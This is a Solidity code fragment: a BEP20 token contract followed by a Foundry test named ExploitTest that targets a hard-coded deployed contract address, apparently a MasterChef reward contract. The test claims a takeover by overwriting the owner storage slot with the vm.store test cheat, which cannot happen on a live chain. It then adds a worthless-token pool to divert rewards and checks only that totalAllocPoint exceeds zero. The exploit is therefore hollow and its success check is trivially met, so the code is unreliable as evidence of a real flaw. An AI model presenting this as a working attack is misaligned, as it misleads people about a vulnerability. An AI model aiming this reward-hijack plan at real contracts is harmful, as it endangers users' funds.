    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint256 totalSupply) public {
        _name = name;
        _symbol = symbol;
        _totalSupply = totalSupply;
        _decimals = 18;
    }

    function getOwner() external override view returns (address) {
        return owner();
    }

    function name() public override view returns (string memory) {
        return _name;
    }

    function symbol() public override view returns (string memory) {
        return _symbol;
    }

    function decimals() public override view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public override view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public override view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 'FixedBEP20: transfer amount exceeds allowance'));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 'FixedBEP20: transfer from the zero address');
        require(recipient != address(0), 'FixedBEP20: transfer to the zero address');
        _balances[sender] = _balances[sender].sub(amount, 'FixedBEP20: transfer amount exceeds balance');
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }


function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 'FixedBEP20: approve from the zero address');
        require(spender != address(0), 'FixedBEP20: approve to the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}


contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2f619a1270226fD8ed3Df82f0C1e0cd90804346d;
    address attacker = address(this);
    FixedBEP20 worthlessToken;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // 1. Take ownership of the contract by overwriting the storage slot for owner.
            // The _owner variable in the Ownable contract is at slot 0.
            vm.store(TARGET, bytes32(0), bytes32(uint256(uint160(attacker))));

            // 2. Start acting as the new owner.
            vm.startPrank(attacker);

            // 3. Create a worthless BEP20 token to create a new pool with.
            worthlessToken = new FixedBEP20("Worthless Token", "WLT", 0);

            // 4. Add the new pool with a very high allocation point to hijack rewards.
            // This will increase totalAllocPoint, satisfying the oracle.
            IMasterChef(TARGET).add(1_000_000, address(worthlessToken), true);

            // 5. Stop acting as the owner.
            vm.stopPrank();
        assertGt(IMasterChef(TARGET).totalAllocPoint(), 0, "Logic Exploit Failed");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

